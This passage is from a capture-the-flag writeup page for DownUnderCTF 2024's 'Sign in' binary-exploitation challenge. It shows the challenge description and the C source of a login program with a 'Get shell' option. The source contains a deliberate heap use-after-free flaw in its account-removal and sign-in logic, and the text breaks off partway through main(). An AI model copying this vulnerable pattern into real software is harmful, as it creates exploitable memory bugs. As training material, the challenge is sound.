
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Writeup for challenge "Sign in" of Down Under CTF 2024">
      
      
      
      
        <link rel="prev" href="../dna/">
      
      
        <link rel="next" href="../sssshhhh/">
      
      
      <link rel="icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.13">
    
    
      
        <title>Sign in writeup - DU CTF 2024</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.7e359304.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    <body dir="ltr">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#prologue" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="DU CTF 2024" class="md-header__button md-logo" aria-label="DU CTF 2024" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            DU CTF 2024
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Sign in writeup
            
          </span>
        </div>
      </div>
    </div>
    
    
    
    
    
      <div class="md-header__source">
        <a href="https://github.com/sukolenvo/2024duCTF" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="DU CTF 2024" class="md-nav__button md-logo" aria-label="DU CTF 2024" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    DU CTF 2024
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/sukolenvo/2024duCTF" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DownUnderCTF 2024 Writeups
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../shufflebox/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Shufflebox
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../number_mashing/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Number mashing
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../transmissions/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Intercepted transmissions
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../vector/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vector overflow
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../decrypt_eval/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Decrypt then eval
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../yawa/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Yawa
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../dna/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DNAdecay
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Sign in
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Sign in
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#prologue" class="md-nav__link">
    <span class="md-ellipsis">
      Prologue
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#my-struggle" class="md-nav__link">
    <span class="md-ellipsis">
      My struggle
    </span>
  </a>
  
    <nav class="md-nav" aria-label="My struggle">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Analysis
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    <span class="md-ellipsis">
      Exploit
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#epilogue" class="md-nav__link">
    <span class="md-ellipsis">
      Epilogue
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../sssshhhh/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    sssshhhh
  </span>
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#prologue" class="md-nav__link">
    <span class="md-ellipsis">
      Prologue
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#my-struggle" class="md-nav__link">
    <span class="md-ellipsis">
      My struggle
    </span>
  </a>
  
    <nav class="md-nav" aria-label="My struggle">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Analysis
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    <span class="md-ellipsis">
      Exploit
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#epilogue" class="md-nav__link">
    <span class="md-ellipsis">
      Epilogue
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
    <a href="https://github.com/sukolenvo/2024duCTF/edit/master/docs/sign_in/index.md" title="Edit this page" class="md-content__button md-icon">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4v-2m10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1 2.1 2.1Z"/></svg>
    </a>
  
  


  <h1>Sign in</h1>

<h2 id="prologue">Prologue<a class="headerlink" href="#prologue" title="Permanent link">&para;</a></h2>
<p>Difficulty: easy</p>
<p>Category: binary exploitation</p>
<p>Solved: 95</p>
<div class="admonition quote">
<p class="admonition-title">Description</p>
<p>Please sign in as root to get a shell.</p>
</div>
<p>Input files:</p>
<details class="info">
<summary>sign-in.c</summary>
<div class="language-c highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">  1</span>
<span class="normal">  2</span>
<span class="normal">  3</span>
<span class="normal">  4</span>
<span class="normal">  5</span>
<span class="normal">  6</span>
<span class="normal">  7</span>
<span class="normal">  8</span>
<span class="normal">  9</span>
<span class="normal"> 10</span>
<span class="normal"> 11</span>
<span class="normal"> 12</span>
<span class="normal"> 13</span>
<span class="normal"> 14</span>
<span class="normal"> 15</span>
<span class="normal"> 16</span>
<span class="normal"> 17</span>
<span class="normal"> 18</span>
<span class="normal"> 19</span>
<span class="normal"> 20</span>
<span class="normal"> 21</span>
<span class="normal"> 22</span>
<span class="normal"> 23</span>
<span class="normal"> 24</span>
<span class="normal"> 25</span>
<span class="normal"> 26</span>
<span class="normal"> 27</span>
<span class="normal"> 28</span>
<span class="normal"> 29</span>
<span class="normal"> 30</span>
<span class="normal"> 31</span>
<span class="normal"> 32</span>
<span class="normal"> 33</span>
<span class="normal"> 34</span>
<span class="normal"> 35</span>
<span class="normal"> 36</span>
<span class="normal"> 37</span>
<span class="normal"> 38</span>
<span class="normal"> 39</span>
<span class="normal"> 40</span>
<span class="normal"> 41</span>
<span class="normal"> 42</span>
<span class="normal"> 43</span>
<span class="normal"> 44</span>
<span class="normal"> 45</span>
<span class="normal"> 46</span>
<span class="normal"> 47</span>
<span class="normal"> 48</span>
<span class="normal"> 49</span>
<span class="normal"> 50</span>
<span class="normal"> 51</span>
<span class="normal"> 52</span>
<span class="normal"> 53</span>
<span class="normal"> 54</span>
<span class="normal"> 55</span>
<span class="normal"> 56</span>
<span class="normal"> 57</span>
<span class="normal"> 58</span>
<span class="normal"> 59</span>
<span class="normal"> 60</span>
<span class="normal"> 61</span>
<span class="normal"> 62</span>
<span class="normal"> 63</span>
<span class="normal"> 64</span>
<span class="normal"> 65</span>
<span class="normal"> 66</span>
<span class="normal"> 67</span>
<span class="normal"> 68</span>
<span class="normal"> 69</span>
<span class="normal"> 70</span>
<span class="normal"> 71</span>
<span class="normal"> 72</span>
<span class="normal"> 73</span>
<span class="normal"> 74</span>
<span class="normal"> 75</span>
<span class="normal"> 76</span>
<span class="normal"> 77</span>
<span class="normal"> 78</span>
<span class="normal"> 79</span>
<span class="normal"> 80</span>
<span class="normal"> 81</span>
<span class="normal"> 82</span>
<span class="normal"> 83</span>
<span class="normal"> 84</span>
<span class="normal"> 85</span>
<span class="normal"> 86</span>
<span class="normal"> 87</span>
<span class="normal"> 88</span>
<span class="normal"> 89</span>
<span class="normal"> 90</span>
<span class="normal"> 91</span>
<span class="normal"> 92</span>
<span class="normal"> 93</span>
<span class="normal"> 94</span>
<span class="normal"> 95</span>
<span class="normal"> 96</span>
<span class="normal"> 97</span>
<span class="normal"> 98</span>
<span class="normal"> 99</span>
<span class="normal">100</span>
<span class="normal">101</span>
<span class="normal">102</span>
<span class="normal">103</span>
<span class="normal">104</span>
<span class="normal">105</span>
<span class="normal">106</span>
<span class="normal">107</span>
<span class="normal">108</span>
<span class="normal">109</span>
<span class="normal">110</span>
<span class="normal">111</span>
<span class="normal">112</span>
<span class="normal">113</span>
<span class="normal">114</span>
<span class="normal">115</span>
<span class="normal">116</span>
<span class="normal">117</span>
<span class="normal">118</span>
<span class="normal">119</span>
<span class="normal">120</span>
<span class="normal">121</span>
<span class="normal">122</span>
<span class="normal">123</span>
<span class="normal">124</span>
<span class="normal">125</span>
<span class="normal">126</span>
<span class="normal">127</span>
<span class="normal">128</span>
<span class="normal">129</span>
<span class="normal">130</span>
<span class="normal">131</span>
<span class="normal">132</span>
<span class="normal">133</span>
<span class="normal">134</span>
<span class="normal">135</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/random.h&gt;</span>

<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">uid</span><span class="p">;</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">username</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">password</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
<span class="p">}</span><span class="w"> </span><span class="n">user_t</span><span class="p">;</span>

<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">user_entry</span><span class="w"> </span><span class="n">user_entry_t</span><span class="p">;</span>
<span class="k">struct</span><span class="w"> </span><span class="nc">user_entry</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">user_t</span><span class="o">*</span><span class="w"> </span><span class="n">user</span><span class="p">;</span>
<span class="w">    </span><span class="n">user_entry_t</span><span class="o">*</span><span class="w"> </span><span class="n">prev</span><span class="p">;</span>
<span class="w">    </span><span class="n">user_entry_t</span><span class="o">*</span><span class="w"> </span><span class="n">next</span><span class="p">;</span>
<span class="p">};</span>

<span class="n">user_entry_t</span><span class="w"> </span><span class="n">user_list</span><span class="p">;</span>
<span class="kt">long</span><span class="w"> </span><span class="n">UID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">    </span><span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">menu</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">choice</span><span class="p">;</span>
<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;1. Sign up&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;2. Sign in&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;3. Remove account&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;4. Get shell&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;&gt; &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">choice</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">choice</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">sign_up</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">user_t</span><span class="o">*</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">user_t</span><span class="p">));</span>
<span class="w">    </span><span class="n">user_entry_t</span><span class="o">*</span><span class="w"> </span><span class="n">entry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">user_entry_t</span><span class="p">));</span>
<span class="w">    </span><span class="n">user</span><span class="o">-&gt;</span><span class="n">uid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UID</span><span class="o">++</span><span class="p">;</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;username: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">user</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;password: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">user</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
<span class="w">    </span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">user</span><span class="p">;</span>

<span class="w">    </span><span class="n">user_entry_t</span><span class="o">*</span><span class="w"> </span><span class="n">curr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">user_list</span><span class="p">;</span>
<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">curr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">prev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">curr</span><span class="p">;</span>
<span class="w">    </span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">entry</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">remove_account</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">uid</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">user_entry_t</span><span class="o">*</span><span class="w"> </span><span class="n">curr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">user_list</span><span class="p">;</span>
<span class="w">    </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">-&gt;</span><span class="n">uid</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">uid</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">prev</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">prev</span><span class="o">-&gt;</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">prev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">prev</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="n">free</span><span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">user</span><span class="p">);</span>
<span class="w">            </span><span class="n">free</span><span class="p">(</span><span class="n">curr</span><span class="p">);</span>
<span class="w">            </span><span class="k">break</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="n">curr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="p">(</span><span class="n">curr</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">long</span><span class="w"> </span><span class="nf">sign_in</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">username</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">password</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;username: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;password: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
<span class="w">    </span><span class="n">user_entry_t</span><span class="o">*</span><span class="w"> </span><span class="n">curr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">user_list</span><span class="p">;</span>
<span class="w">    </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">memcmp</span><span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Logging in as %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">);</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">-&gt;</span><span class="n">uid</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="n">curr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="p">(</span><span class="n">curr</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">init</span><span class="p">();</span>

<span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">uid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">    </span><span class="n">user_t</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="p">.</span><span class="n">uid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;root&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="p">};</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">getrandom</span><span class="p">(</span><span class="n">root</span><span class="p">.</span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="n">user_list</span><span class="p">.</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="w">    </span><span class="n">user_list</span><span class="p">.</span><span class="n">prev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
